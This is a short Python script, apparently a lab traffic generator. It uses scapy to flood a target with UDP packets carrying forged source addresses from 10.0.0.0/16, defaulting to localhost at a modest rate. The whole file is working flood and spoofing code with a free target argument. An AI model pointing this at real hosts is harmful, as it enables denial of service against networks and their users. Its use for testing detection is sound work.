#!/usr/bin/env python3
"""UDP flood simulator — spoofed src IPs from 10.0.0.0/16 (256 /24 prefixes)."""
import argparse
import random
import time
import signal

from scapy.all import IP, UDP, Raw, send

_running = True


def _stop(sig, frame):
    global _running
    _running = False


def parse_args():
    p = argparse.ArgumentParser()
    p.add_argument("--target",   default="127.0.0.1")
    p.add_argument("--port",     type=int, default=9999)
    p.add_argument("--rate",     type=int, default=500)
    p.add_argument("--duration", type=int, default=30)
    return p.parse_args()


def rand_ip():
    return f"10.0.{random.randint(0,255)}.{random.randint(1,254)}"


def main():
    signal.signal(signal.SIGINT, _stop)
    signal.signal(signal.SIGTERM, _stop)

    args = parse_args()
    interval = 1.0 / max(1, args.rate)
    deadline = time.time() + args.duration if args.duration > 0 else float("inf")
    payload  = b"X" * 64

    print(f"[UDP] target={args.target}:{args.port}  rate={args.rate}pps  duration={args.duration}s")
    sent = 0

    while _running and time.time() < deadline:
        pkt = IP(src=rand_ip(), dst=args.target) / UDP(sport=random.randint(1024, 65535),
                                                        dport=args.port) / Raw(payload)
        send(pkt, verbose=False)
        sent += 1
        time.sleep(interval)

    print(f"[UDP] done — sent {sent} packets")


if __name__ == "__main__":
    main()
